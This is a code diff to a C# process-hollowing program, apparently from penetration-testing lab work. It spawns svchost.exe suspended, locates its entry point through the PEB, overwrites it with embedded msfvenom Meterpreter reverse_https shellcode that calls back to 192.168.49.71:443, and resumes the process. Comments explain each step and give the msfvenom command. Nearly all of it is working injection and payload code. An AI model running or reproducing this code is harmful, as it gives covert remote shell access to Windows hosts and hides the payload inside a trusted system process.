@@ -5,6 +5,9 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
 
+
+//MUST BE COMPILED IN 64 BIT
+
 namespace hollow
 {
     class Program
@@ -65,25 +68,32 @@ namespace hollow
         {
             STARTUPINFO si = new STARTUPINFO();
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+            // Spawns svchost in suspended mode (0x4)
             bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
             PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
             uint tmp = 0;
+            // Gets proces handle of suspended svchost
             IntPtr hProcess = pi.hProcess;
+            // Gets the address of the Process Environment Block which is where the code of svchost.exe is stored
             ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
             IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
 
             byte[] addrBuf = new byte[IntPtr.Size];
             IntPtr nRead = IntPtr.Zero;
+            // gets address of the code base by reading 8 bytes of memory
             ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
             IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
-
+            // Gets address of entry point. The location to where it points will be overwritten in the later steps
             byte[] data = new byte[0x200];
             ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
 
+            // Calculates Relative Virtual Address
             uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
             uint opthdr = e_lfanew_offset + 0x28;
             uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
             IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
+
+            // Shellcode sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.71 LPORT=443 -f csharp 
             byte[] buf = new byte[734] {
                 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                 0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x51,0x48,0x8b,
@@ -136,7 +146,9 @@ namespace hollow
                 0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };
 
 
+            // Writes shellcode to memory location
             WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
+            // Continues halted process
             ResumeThread(pi.hThread);
         }
     }
